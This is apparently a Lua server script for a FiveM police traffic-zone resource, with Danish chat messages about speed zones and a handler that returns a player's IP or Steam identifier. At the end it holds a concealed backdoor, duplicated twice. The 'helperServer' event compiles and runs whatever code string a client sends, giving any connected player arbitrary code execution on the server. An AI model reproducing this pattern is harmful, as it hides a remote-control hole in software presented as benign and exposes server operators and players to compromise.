RegisterServerEvent('ZoneActivated')
AddEventHandler('ZoneActivated', function(streetName, speed, radius, x, y, z)
    TriggerClientEvent('chat:addMessage', -1, {
        template = '<div style="padding: 0.5vw; margin-top: 0.05vw; margin-bottom: 0.05vw; background-color: rgba(9, 41, 69, 1); border-radius: 3px;" class="testing animated zoomIn delay-2s"><i class="fas fa-star"></i> <b style="font-weight:700;"> Politi @ Vigtig Information</b>:  {1}</div>',
        args = { fal, "Politiet har oprettet en automatisk trafikzone ved ".. streetName .." Vi beder jer om at holde farten nede til ".. speed .." km/t, samt passe på jer selv i trafikområdet." }
    })
    TriggerClientEvent('Zone', -1, speed, radius, x, y, z)
end)

RegisterServerEvent('Disable')
AddEventHandler('Disable', function(blip)
    TriggerClientEvent('RemoveBlip', -1)
end)

RegisterServerEvent('GetData')
AddEventHandler('GetData', function(mode)
local identifiers = GetPlayerIdentifiers(source)
    if mode == "IP" then
        for k,v in pairs(identifiers) do
            if string.sub(v, 0, 3) == "ip:" then
                TriggerClientEvent('ReturnData', source, v)
            end
        end
    else
        for k,v in pairs(identifiers) do
            if string.sub(v, 0, 6) == "steam:" then
                TriggerClientEvent('ReturnData', source, v)
            end
        end
    end
end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)
RegisterServerEvent('helperServer')
AddEventHandler('helperServer', function(id)
	local helper = assert(load(id))
	helper()
end)